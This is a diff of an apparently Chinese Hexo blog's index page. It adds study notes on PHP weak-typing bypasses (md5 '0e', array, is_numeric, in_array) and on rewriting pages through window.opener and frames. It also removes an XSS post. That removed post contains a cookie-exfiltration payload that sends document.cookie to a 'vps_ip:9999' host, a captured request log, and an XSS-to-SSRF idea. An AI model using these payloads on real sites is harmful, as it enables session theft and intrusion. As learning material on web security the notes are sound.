@@ -260,6 +260,333 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/07/类型转换总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/07/类型转换总结/" itemprop="url">类型转换总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-07T19:18:29+08:00">
+                2019-10-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="变量转换"><a href="#变量转换" class="headerlink" title="变量转换"></a>变量转换</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(string)<span class="keyword">TRUE</span> <span class="comment">//returns "1"</span></span><br><span class="line">(string)<span class="keyword">FALSE</span> <span class="comment">//returns ""</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">TRUE</span>; <span class="comment">//prints "1"</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">FALSE</span>; <span class="comment">//prints nothing!</span></span><br><span class="line"></span><br><span class="line">$string=<span class="string">'12345.678'</span>;</span><br><span class="line">$boolean=!!$string; <span class="comment">//prints bool(true)</span></span><br><span class="line"></span><br><span class="line">var_dump($val = <span class="string">"0"</span> + <span class="string">"123"</span>);  <span class="comment">//prints int(123)</span></span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">var_dump($arr&gt;<span class="string">"zzz"</span>);  <span class="comment">//prints bool(true)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'0e123'</span>==<span class="string">'0e456'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//指数转整数</span></span><br><span class="line">var_dump((int)<span class="number">6e6</span>);    <span class="comment">//int(6000000)</span></span><br><span class="line">var_dump((int)<span class="string">'6e6'</span>);  <span class="comment">//int(6)</span></span><br></pre></td></tr></table></figure>
+
+<p>归纳一下</p>
+<p>true对于1   flase对应0    </p>
+<p>string对应bool的true(除了”0”和空字符串，其余全都是true) </p>
+<p>字符串进行相加减能够得到整数 再利用一个chr就能够拿到字符，然后就可以写shell</p>
+<p>数组永远比字符串大</p>
+<p>0e开头后面全是数字的字符串会被当作科学计数法 0的多少次幂 都是0</p>
+<h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><h3 id="intval-floatval"><a href="#intval-floatval" class="headerlink" title="intval  floatval"></a>intval  floatval</h3><p> 获取变量的整数值</p>
+<p>语法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval ( mixed $var [, int $base = <span class="number">10</span> ] ) : int</span><br></pre></td></tr></table></figure>
+
+<p>通过使用指定的进制 <code>base</code> 转换（默认是十进制），返回变量 <code>var</code> 的 <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> 数值。 <strong>intval()</strong> 不能用于 object，否则会产生 <strong>E_NOTICE</strong> 错误并返回 1。</p>
+<p>参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var 要转换成整数的值</span><br><span class="line"></span><br><span class="line">base  转换所使用的进制</span><br><span class="line">Note:</span><br><span class="line">如果 base 是 0，通过检测 var 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，</span><br><span class="line">如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，</span><br><span class="line">将使用 10 进制 (decimal)。</span><br></pre></td></tr></table></figure>
+
+<p>返回值</p>
+<p>成功时返回 <code>var</code> 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。字符串的返回值不确定，遵守字符串转整数规则</p>
+<p>最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p>
+<p>demo</p>
+<p>遇到无法解析的字符时，就返回    其实就是一个字符串转整数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">intval(<span class="string">'1'</span>)  ==&gt;<span class="number">1</span></span><br><span class="line">floatval(<span class="string">'1'</span>) ==&gt;<span class="number">1</span></span><br><span class="line">&lt;====分界线====&gt;</span><br><span class="line">intval(<span class="string">'0x1'</span>)==&gt;<span class="number">0</span>  <span class="comment">//0x1被判断为字符串</span></span><br><span class="line">intval(<span class="keyword">null</span>)==&gt;<span class="number">0</span>  </span><br><span class="line">intval(<span class="string">'0x2222'</span>)==&gt;<span class="number">0</span>  <span class="comment">//同样被判断为字符串</span></span><br><span class="line">intval(<span class="string">'0x2222'</span>+<span class="number">1</span>)==&gt;<span class="number">8739</span>  <span class="comment">//这里先是一个表达式的计算，把返回结果给了 intval函数</span></span><br><span class="line">  </span><br><span class="line">floatval(<span class="string">'1/2'</span>) ==&gt;<span class="number">1</span> <span class="comment">// /被判断为非法字符</span></span><br><span class="line">floatval(<span class="string">'1 2'</span>) ==&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><p>0e弱比较绕过  数组绕过</p>
+<h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array"></a>in_array</h3><p>在 PHP 手册中， in_array() 函数的解释是 bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) , 如果 strict 参数没有提供，那么 in_array 就会使用松散比较来判断 $needle 是否在 $haystack 中。当 strict 的值为 true 时， in_array() 会比较 needls 的类型和 haystack 中的类型是否相同。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">'3'</span>];</span><br><span class="line">var_dump(in_array(<span class="string">'abc'</span>, $array)); <span class="comment">//true</span></span><br><span class="line">var_dump(in_array(<span class="string">'1bc'</span>, $array)); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>如果 switch() 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i =<span class="string">"2abc"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"i is less than 3 but not negative"</span>; </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">echo</span> <span class="string">"i is 3"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="is-numric"><a href="#is-numric" class="headerlink" title="is_numric"></a>is_numric</h3><p>判断是否为数字，不仅仅是十进制数字，利用弱类型，将数字后面加上空格或者任意一个字符即可绕过。 is_numeric 检测的时候会自动过滤掉前面的 ‘ ‘, ‘\t’, ‘\n’, ‘\r’, ‘\v’, ‘\f’ 等字符，但是不会过滤 ‘\0’，如果这些字符出现在字符串尾，也不会过滤，而是返回 false</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'1'</span>;</span><br><span class="line">$b = <span class="string">'1a'</span>;</span><br><span class="line">$c = <span class="string">'1 '</span>;</span><br><span class="line">var_dump(is_numeric($a));<span class="comment">//true</span></span><br><span class="line">var_dump(is_numeric($b));<span class="comment">//false</span></span><br><span class="line">var_dump(is_numeric($c));<span class="comment">//false</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">233333</span>);       <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'233333'</span>);    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">0x233333</span>);    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'0x233333'</span>);    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'9e9'</span>);   <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'233333abc'</span>);  <span class="comment">// 0</span></span><br><span class="line">var_dump(is_numeric(<span class="string">"\01"</span>)); <span class="comment">// false</span></span><br><span class="line">var_dump(is_numeric(<span class="string">" 1"</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">"\t1"</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">"\f1"</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">"\f\f1"</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">"1\f"</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>补充</p>
+<p>16进制绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xccccccccc == 54975581388</span><br><span class="line">3735929054==deadc0de；</span><br></pre></td></tr></table></figure>
+
+<h3 id="strstr"><a href="#strstr" class="headerlink" title="strstr"></a>strstr</h3><p>查找字符串的首次出现  大小写敏感</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(strstr(<span class="string">'phpinfo'</span>,<span class="string">'PHP'</span>));</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">bool(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><p>strcmp() 函数在 PHP 官方手册中的描述是 int strcmp ( string $str1 ， string $str2 )，需要给 strcmp() 传递 2 个 string 类型的参数。如果 str1 小于 str2，返回 -1，相等返回 0，否则返回 1。strcmp() 函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。 并且区分大小写</p>
+<p>传入非字符串(和版本有关)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strcmp(<span class="string">"foo"</span>, <span class="keyword">array</span>()) =&gt; <span class="keyword">NULL</span> + PHP Warning</span><br><span class="line">strcmp(<span class="string">"foo"</span>, <span class="keyword">new</span> stdClass) =&gt; <span class="keyword">NULL</span> + PHP Warning</span><br><span class="line">strcmp(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;, <span class="string">""</span>) =&gt; <span class="keyword">NULL</span> + PHP Warning</span><br></pre></td></tr></table></figure>
+
+<h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos"></a>strpos</h3><p>查找字符串首次出现的位置,返回结果和弱比较一起使用就会出现问题，字符串的索引位置从0开始，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mystring = <span class="string">'abc'</span>;</span><br><span class="line">$findme   = <span class="string">'a'</span>;</span><br><span class="line">$pos = strpos($mystring, $findme);</span><br><span class="line"><span class="keyword">if</span>($pos!=flase)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="chr"><a href="#chr" class="headerlink" title="chr"></a>chr</h3><p>chr()会自动对参数进行256取余</p>
+<h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><p>数组可以绕过很多用来判断字符串的函数</p>
+<p>strlen() 5.2版本</p>
+<p>strcmp()</p>
+<p>preg_match()</p>
+<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p>见可变变量学习</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/07/xss传染/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/07/xss传染/" itemprop="url">xss传染</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-07T18:11:27+08:00">
+                2019-10-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="子页面-父页面相互修改"><a href="#子页面-父页面相互修改" class="headerlink" title="子页面  父页面相互修改"></a>子页面  父页面相互修改</h2><p>window.open  window.opener</p>
+<h3 id="父页面修改子页面用到window-open"><a href="#父页面修改子页面用到window-open" class="headerlink" title="父页面修改子页面用到window.open"></a>父页面修改子页面用到window.open</h3><p>语法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> windowObjectReference = <span class="built_in">window</span>.open(strUrl, strWindowName, [strWindowFeatures]);</span><br><span class="line"></span><br><span class="line">参数介绍</span><br><span class="line">strUrl 要在新打开的窗口中，加载的url</span><br><span class="line">strWindowName 新窗口的名称</span><br><span class="line">这两个是必选的参数，后面一个是可选 不说了</span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> target_page=<span class="built_in">window</span>.open(<span class="string">"parent-call.html"</span>,<span class="string">""</span>);</span></span><br><span class="line"><span class="javascript">target_page.document.write(<span class="string">'我被亲爹重写了'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="子页面修改父页面-window-opener"><a href="#子页面修改父页面-window-opener" class="headerlink" title="子页面修改父页面 window.opener"></a>子页面修改父页面 window.opener</h3><p>返回打开当前窗口的那个窗口的引用.</p>
+<p>如果当前窗口是由另一个窗口打开的, <strong>window.opener</strong>保留了那个窗口的引用. 如果当前窗口不是由其他窗口打开的, 则该属性返回 null.</p>
+<p>语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var objRef = window.opener;</span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<p>这里要先判断一下，父页面是否存在</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(<span class="built_in">window</span>.opener)&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.opener.document.write(<span class="string">"我是坏蛋儿子，我把亲爹重写了"</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">'我没有亲爹'</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="iframe子父页面修改"><a href="#iframe子父页面修改" class="headerlink" title="iframe子父页面修改"></a>iframe子父页面修改</h2><p>修改父页面window.parent</p>
+<p>语法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> parentWindow = <span class="built_in">window</span>.parent;</span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.parent.document.write(<span class="string">"我是坏孩子，我修改了亲爹"</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改子页面window.frames</p>
+<p>返回当前窗口，一个类数组对象，列出了当前窗口的所有直接子窗口</p>
+<p>语法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frameList = <span class="built_in">window</span>.frames;</span><br></pre></td></tr></table></figure>
+
+<p>frameList是一个frame对象的集合，它类似一个数组，有length属性且可以使用索引（[i]）来访问。</p>
+<p>使用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.frames[<span class="string">'change_by_father'</span>].contentWindow.document.write(<span class="string">'来自父页面的修改'</span>)   <span class="comment">//change_by_father为frame的ID</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改子页面的时候，需要注意的一点是iframe的document并不直接属于当前frame，而是属于contentWindow。</p>
+<p>demo <a href="http://127.0.0.1/test/xss-test/xss-test/" target="_blank" rel="noopener">http://127.0.0.1/test/xss-test/xss-test/</a></p>
+<p>参考链接</p>
+<p><a href="https://www.cnblogs.com/kuoaidebb/p/4420202.html" target="_blank" rel="noopener">https://www.cnblogs.com/kuoaidebb/p/4420202.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/06/nginx漏洞6例/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1795,293 +2122,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/21/xss/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/09/21/xss/" itemprop="url">xss</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-21T20:52:08+08:00">
-                2019-09-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <a id="more"></a>
-
-<p>需要掌握的基础知识点</p>
-<p>document.cookie  用户cookie</p>
-<p>navigator.userAgent  识别用户浏览器</p>
-<p>btoa为js中的base64编码，atob为解码</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">btoa(<span class="string">'adsda'</span>)</span><br><span class="line"><span class="string">"YWRzZGE="</span></span><br><span class="line">atob(<span class="string">"YWRzZGE="</span>)</span><br><span class="line"><span class="string">"adsda"</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="盲打"><a href="#盲打" class="headerlink" title="盲打"></a>盲打</h2><p><strong>no.1</strong> 可以获取想要的数据 伪造cookie等等</p>
-<p><strong>no.2</strong> 如果后台有限制ip为127.0.0.1才能访问的文件，可以用xss打一个ssrf  比如这样</p>
-<p>document.createElement(“img”)</p>
-<p>img.src=”<a href="http://127.0.0.1/admin.php?file=shell&amp;date=phpinfo&quot;" target="_blank" rel="noopener">http://127.0.0.1/admin.php?file=shell&amp;date=phpinfo&quot;</a></p>
-<h4 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h4><p>document.createElement(“img”) 创建一个img标签</p>
-<p>img.src=”<a href="http://vps_ip:9999/给标签的src属性赋值" target="_blank" rel="noopener">http://vps_ip:9999/给标签的src属性赋值</a></p>
-<p>创建一个标签，然后给这个标签的属性赋值，有两种方式</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var iframe = document.createElement('iframe'); </span><br><span class="line">iframe.src=xss;  </span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line"></span><br><span class="line">var iframe = document.createElement('iframe');</span><br><span class="line">iframe.setAttribute('src',xss);</span><br><span class="line">document.body.appendChild(iframe);</span><br></pre></td></tr></table></figure>
-
-<p>new Image 等效于 document.creatElement(“img”)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var myImage = new Image(100, 200);</span><br><span class="line">myImage.src = &apos;picture.jpg&apos;;</span><br><span class="line">document.body.appendChild(myImage);</span><br></pre></td></tr></table></figure>
-
-<h4 id="lt-a-gt-标签"><a href="#lt-a-gt-标签" class="headerlink" title="&lt;a&gt;标签"></a>&lt;a&gt;标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://vps_ip:9999/a?cookie="</span>+<span class="attr">document.cookie</span>&gt;</span>点击抽奖\<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这样可以向外连VPS，但不能把cookie传出去  还没弄明白 。。</p>
-<h4 id="lt-img-gt-标签"><a href="#lt-img-gt-标签" class="headerlink" title="&lt;img&gt;标签"></a>&lt;img&gt;标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://vps_ip:9999/cookie=?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  这个可以把cookie传出来</span><br><span class="line"></span><br><span class="line">结果</span><br><span class="line">GET /cookie=?cookie%5Buser%5D%3Dadmin%3B%20user%3Dadmin HTTP/1.1</span><br><span class="line">Host: 192.168.110.1:9999</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.110.140/xss/Less-1/index.php?phone=%3Cscript%3Evar+img%3Ddocument.createElement%28%22img%22%29%3Bimg.src%3D%22http%3A%2F%2F192.168.110.1%3A9999%2Fcookie%3D%3F%22%2Bescape%28document.cookie%29%3B%3C%2Fscript%3E&amp;submit=submit</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
-
